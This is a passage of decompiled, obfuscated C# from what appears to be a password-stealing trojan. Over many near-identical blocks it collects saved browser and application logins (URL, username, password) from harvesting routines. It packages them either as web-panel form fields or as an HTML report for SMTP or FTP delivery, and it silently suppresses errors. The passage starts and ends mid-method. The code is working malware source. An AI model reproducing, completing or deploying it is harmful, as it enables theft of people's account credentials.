			ProjectData.ClearProjectError();
		}
		try
		{
			object obj2 = AEM.XF();
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj2, null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator2 = default(IEnumerator);
				try
				{
					enumerator2 = ((IEnumerable)obj2).GetEnumerator();
					while (enumerator2.MoveNext())
					{
						JK jK2 = (JK)enumerator2.Current;
						string browser = jK2.NP_115;
						string uRL = jK2.WE_114;
						string userName = jK2.ECS_112;
						string password = jK2.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj3 = AEM.NJG();
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj3, null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator3 = default(IEnumerator);
				try
				{
					enumerator3 = ((IEnumerable)obj3).GetEnumerator();
					while (enumerator3.MoveNext())
					{
						JK jK3 = (JK)enumerator3.Current;
						string browser = jK3.NP_115;
						string uRL = jK3.WE_114;
						string userName = jK3.ECS_112;
						string password = jK3.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator3 is IDisposable)
					{
						(enumerator3 as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception ex6 = ex5;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj4 = AEM.BIH();
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj4, null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator4 = default(IEnumerator);
				try
				{
					enumerator4 = ((IEnumerable)obj4).GetEnumerator();
					while (enumerator4.MoveNext())
					{
						JK jK4 = (JK)enumerator4.Current;
						string browser = jK4.NP_115;
						string uRL = jK4.WE_114;
						string userName = jK4.ECS_112;
						string password = jK4.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator4 is IDisposable)
					{
						(enumerator4 as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7);
			Exception ex8 = ex7;
			ProjectData.ClearProjectError();
		}
		try
		{
			List<JK> list = new List<JK>(AEM.DNC());
			if (list.Count > 0)
			{
				foreach (JK item in list)
				{
					string browser = item.NP_115;
					string uRL = item.WE_114;
					string userName = item.ECS_112;
					string password = item.GA_113;
					if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
					{
						if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
						{
							stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
						}
						else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
						{
							stringBuilder.AppendLine("<br>");
							stringBuilder.AppendLine("URL:      " + uRL + "<br>");
							stringBuilder.AppendLine("Username: " + userName + "<br>");
							stringBuilder.AppendLine("Password: " + password + "<br>");
							stringBuilder.AppendLine("Application: " + browser + "<br>");
						}
					}
				}
			}
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9);
			Exception ex10 = ex9;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj5 = AEM.QHE();
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj5, null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator6 = default(IEnumerator);
				try
				{
					enumerator6 = ((IEnumerable)obj5).GetEnumerator();
					while (enumerator6.MoveNext())
					{
						JK jK5 = (JK)enumerator6.Current;
						string browser = jK5.NP_115;
						string uRL = jK5.WE_114;
						string userName = jK5.ECS_112;
						string password = jK5.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator6 is IDisposable)
					{
						(enumerator6 as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex11)
		{
			ProjectData.SetProjectError(ex11);
			Exception ex12 = ex11;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj6 = AEM.HAF();
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj6, null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator7 = default(IEnumerator);
				try
				{
					enumerator7 = ((IEnumerable)obj6).GetEnumerator();
					while (enumerator7.MoveNext())
					{
						JK jK6 = (JK)enumerator7.Current;
						string browser = jK6.NP_115;
						string uRL = jK6.WE_114;
						string userName = jK6.ECS_112;
						string password = jK6.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator7 is IDisposable)
					{
						(enumerator7 as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex13)
		{
			ProjectData.SetProjectError(ex13);
			Exception ex14 = ex13;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj7 = AEM.LA();
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj7, null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator8 = default(IEnumerator);
				try
				{
					enumerator8 = ((IEnumerable)obj7).GetEnumerator();
					while (enumerator8.MoveNext())
					{
						JK jK7 = (JK)enumerator8.Current;
						string browser = jK7.NP_115;
						string uRL = jK7.WE_114;
						string userName = jK7.ECS_112;
						string password = jK7.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator8 is IDisposable)
					{
						(enumerator8 as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex15)
		{
			ProjectData.SetProjectError(ex15);
			Exception ex16 = ex15;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj8 = AEM.PQL();
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj8, null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator9 = default(IEnumerator);
				try
				{
					enumerator9 = ((IEnumerable)obj8).GetEnumerator();
					while (enumerator9.MoveNext())
					{
						JK jK8 = (JK)enumerator9.Current;
						string browser = jK8.NP_115;
						string uRL = jK8.WE_114;
						string userName = jK8.ECS_112.Replace(@"
", "");
						string password = jK8.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator9 is IDisposable)
					{
						(enumerator9 as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex17)
		{
			ProjectData.SetProjectError(ex17);
			Exception ex18 = ex17;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj9 = AEM.HYM();
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj9, null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator10 = default(IEnumerator);
				try
				{
					enumerator10 = ((IEnumerable)obj9).GetEnumerator();
					while (enumerator10.MoveNext())
					{
						JK jK9 = (JK)enumerator10.Current;
						string browser = jK9.NP_115;
						string uRL = jK9.WE_114;
						string userName = jK9.ECS_112;
						string password = jK9.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator10 is IDisposable)
					{
						(enumerator10 as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex19)
		{
			ProjectData.SetProjectError(ex19);
			Exception ex20 = ex19;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj10 = AEM.EMB();
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj10, null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator11 = default(IEnumerator);
				try
				{
					enumerator11 = ((IEnumerable)obj10).GetEnumerator();
					while (enumerator11.MoveNext())
					{
						JK jK10 = (JK)enumerator11.Current;
						string browser = jK10.NP_115;
						string uRL = jK10.WE_114;
						string userName = jK10.ECS_112;
						string password = jK10.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator11 is IDisposable)
					{
						(enumerator11 as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex21)
		{
			ProjectData.SetProjectError(ex21);
			Exception ex22 = ex21;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj11 = AEM.RD();
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj11, null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator12 = default(IEnumerator);
				try
				{
					enumerator12 = ((IEnumerable)obj11).GetEnumerator();
					while (enumerator12.MoveNext())
					{
						JK jK11 = (JK)enumerator12.Current;
						string browser = jK11.NP_115;
						string uRL = jK11.WE_114;
						string userName = jK11.ECS_112;
						string password = jK11.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator12 is IDisposable)
					{
						(enumerator12 as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex23)
		{
			ProjectData.SetProjectError(ex23);
			Exception ex24 = ex23;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj12 = AEM.FV();
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj12, null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator13 = default(IEnumerator);
				try
				{
					enumerator13 = ((IEnumerable)obj12).GetEnumerator();
					while (enumerator13.MoveNext())
					{
						JK jK12 = (JK)enumerator13.Current;
						string browser = jK12.NP_115;
						string uRL = jK12.WE_114;
						string userName = jK12.ECS_112;
						string password = jK12.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator13 is IDisposable)
					{
						(enumerator13 as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex25)
		{
			ProjectData.SetProjectError(ex25);
			Exception ex26 = ex25;
			ProjectData.ClearProjectError();
		}
		try
		{
			List<JK> list2 = new List<JK>();
			list2 = AEM.PK();
			if (list2.Count > 0)
			{
				foreach (JK item2 in list2)
				{
					string browser = item2.NP_115;
					string uRL = item2.WE_114;
					string userName = item2.ECS_112;
					string password = item2.GA_113;
					if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
					{
						if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
						{
							stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
						}
						else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
						{
							stringBuilder.AppendLine("<br>");
							stringBuilder.AppendLine("URL:      " + uRL + "<br>");
							stringBuilder.AppendLine("Username: " + userName + "<br>");
							stringBuilder.AppendLine("Password: " + password + "<br>");
							stringBuilder.AppendLine("Application: " + browser + "<br>");
						}
					}
				}
			}
		}
		catch (Exception ex27)
		{
			ProjectData.SetProjectError(ex27);
			Exception ex28 = ex27;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj13 = AEM.FU();
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj13, null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator15 = default(IEnumerator);
				try
				{
					enumerator15 = ((IEnumerable)obj13).GetEnumerator();
					while (enumerator15.MoveNext())
					{
						JK jK13 = (JK)enumerator15.Current;
						string browser = jK13.NP_115;
						string uRL = jK13.WE_114;
						string userName = jK13.ECS_112;
						string password = jK13.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator15 is IDisposable)
					{
						(enumerator15 as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex29)
		{
			ProjectData.SetProjectError(ex29);
			Exception ex30 = ex29;
			ProjectData.ClearProjectError();
		}
		try
		{
			List<JK> list3 = AEM.GV_();
			if (list3.Count > 0)
			{
				foreach (JK item3 in list3)
				{
					string browser = item3.NP_115;
					string uRL = item3.WE_114;
					string userName = item3.ECS_112;
					string password = item3.GA_113;
					if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
					{
						if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
						{
							stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
						}
						else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
						{
							stringBuilder.AppendLine("<br>");
							stringBuilder.AppendLine("URL:      " + uRL + "<br>");
							stringBuilder.AppendLine("Username: " + userName + "<br>");
							stringBuilder.AppendLine("Password: " + password + "<br>");
							stringBuilder.AppendLine("Application: " + browser + "<br>");
						}
					}
				}
			}
		}
		catch (Exception ex31)
		{
			ProjectData.SetProjectError(ex31);
			Exception ex32 = ex31;
			Interaction.MsgBox(ex32.ToString());
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj14 = AEM.RY();
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj14, null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator17 = default(IEnumerator);
				try
				{
					enumerator17 = ((IEnumerable)obj14).GetEnumerator();
					while (enumerator17.MoveNext())
					{
						JK jK14 = (JK)enumerator17.Current;
						string browser = jK14.NP_115;
						string uRL = jK14.WE_114;
						string userName = jK14.ECS_112;
						string password = jK14.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator17 is IDisposable)
					{
						(enumerator17 as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex33)
		{
			ProjectData.SetProjectError(ex33);
			Exception ex34 = ex33;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj15 = AEM.PVO();
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj15, null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator18 = default(IEnumerator);
				try
				{
					enumerator18 = ((IEnumerable)obj15).GetEnumerator();
					while (enumerator18.MoveNext())
					{
						JK jK15 = (JK)enumerator18.Current;
						string browser = jK15.NP_115;
						string uRL = jK15.WE_114;
						string userName = jK15.ECS_112;
						string password = jK15.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator18 is IDisposable)
					{
						(enumerator18 as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex35)
		{
			ProjectData.SetProjectError(ex35);
			Exception ex36 = ex35;
			ProjectData.ClearProjectError();
		}
		try
		{
			if (AEM.PCK() != null)
			{
				JK jK16 = AEM.PCK();
				string browser = jK16.NP_115;
				string uRL = jK16.WE_114;
				string userName = jK16.ECS_112;
				string password = jK16.GA_113;
				if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
				{
					if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
					{
						stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
					}
					else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
					{
						stringBuilder.AppendLine("<br>");
						stringBuilder.AppendLine("URL:      " + uRL + "<br>");
						stringBuilder.AppendLine("Username: " + userName + "<br>");
						stringBuilder.AppendLine("Password: " + password + "<br>");
						stringBuilder.AppendLine("Application: " + browser + "<br>");
					}
				}
			}
		}
		catch (Exception ex37)
		{
			ProjectData.SetProjectError(ex37);
			Exception ex38 = ex37;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj16 = AEM.FJ();
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj16, null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator19 = default(IEnumerator);
				try
				{
					enumerator19 = ((IEnumerable)obj16).GetEnumerator();
					while (enumerator19.MoveNext())
					{
						JK jK17 = (JK)enumerator19.Current;
						string browser = jK17.NP_115;
						string uRL = jK17.WE_114;
						string userName = jK17.ECS_112;
						string password = jK17.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator19 is IDisposable)
					{
						(enumerator19 as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex39)
		{
			ProjectData.SetProjectError(ex39);
			Exception ex40 = ex39;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj17 = AEM.GJ();
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj17, null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator20 = default(IEnumerator);
				try
				{
					enumerator20 = ((IEnumerable)obj17).GetEnumerator();
					while (enumerator20.MoveNext())
					{
						JK jK18 = (JK)enumerator20.Current;
						string browser = jK18.NP_115;
						string uRL = jK18.WE_114;
						string userName = jK18.ECS_112;
						string password = jK18.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator20 is IDisposable)
					{
						(enumerator20 as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex41)
		{
			ProjectData.SetProjectError(ex41);
			Exception ex42 = ex41;
			ProjectData.ClearProjectError();
		}
		try
		{
			if (AEM.UCO().Count > 0)
			{
				foreach (JK item4 in AEM.UCO())
				{
					string browser = item4.NP_115;
					string uRL = item4.WE_114;
					string userName = item4.ECS_112;
					string password = item4.GA_113;
					if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
					{
						if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
						{
							stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
						}
						else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
						{
							stringBuilder.AppendLine("<br>");
							stringBuilder.AppendLine("URL:      " + uRL + "<br>");
							stringBuilder.AppendLine("Username: " + userName + "<br>");
							stringBuilder.AppendLine("Password: " + password + "<br>");
							stringBuilder.AppendLine("Application: " + browser + "<br>");
						}
					}
				}
			}
		}
		catch (Exception ex43)
		{
			ProjectData.SetProjectError(ex43);
			Exception ex44 = ex43;
			ProjectData.ClearProjectError();
		}
		try
		{
			if (AEM.SV().Count > 0)
			{
